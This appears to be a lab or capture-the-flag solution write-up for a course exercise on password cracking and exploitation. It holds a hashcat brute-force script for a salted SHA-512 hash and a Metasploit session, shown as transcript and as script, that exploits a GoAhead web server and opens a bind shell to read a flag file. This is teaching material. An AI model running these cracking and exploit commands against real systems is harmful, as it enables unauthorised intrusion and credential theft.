# Lab 04 - Password cracking and exploitation

## 1

```sh
#!/bin/sh

echo "{SSHA512}FhFw5Pfw6kQEiSP4+tSkew5kdRzCdtqGaybFFRsPH1OA1oUYqkLdDSg6WzfRCoL3FN1pXyGq9OlE+1iYCUI0uFsG9FNFwls3" >hash.txt
hashcat -a 3 -m 1711 hash.txt -1 ?l?d ?1?1?1?1?1?1?1?1?1?1 --increment --increment-min 4 --increment-max 10 >/dev/null 2>&1
PASSWORD=$(hashcat -m 1711 hash.txt --show | cut -d : -f 2)
echo "TPAS{$PASSWORD}"
rm hash.txt
```

## 2

```
$ msfconsole

msf6 > use exploit/linux/http/goahead_ldpreload
msf6 set target Linux x86_64
msf6 set payload generic/shell_bind_tcp
msf6 set LPORT 5060
msf6 set RHOSTS msf1.tpas.pwning.re
msf6 set RPORT 443
msf6 set SSL true
msf6 exploit

[*] Searching 390 paths for an exploitable CGI endpoint...
[+] Exploitable CGI located at /cgi-bin/index
[*] Started bind TCP handler against 165.22.83.227:5060
[*] Command shell session 1 opened (192.168.1.219:42229 -> 165.22.83.227:5060) at 2021-11-20 09:59:51 +0000

cat /flag.txt
TPAS{6bb0a00240a978e172d2ba51d65141cc50a0bfee}
```

This could also be achieved with the following script

```sh
#!/bin/sh

echo "cat /flag.txt ; exit" | msfconsole -q -x "use exploit/linux/http/goahead_ldpreload ; set target Linux x86_64 ; set payload generic/shell_bind_tcp ; set LPORT 5060 ; set RHOSTS msf1.tpas.pwning.re ; set RPORT 443 ; set SSL true ; exploit" -o tmp 2>/dev/null 
grep -oE "TPAS{.+}" tmp --color=none
rm tmp
```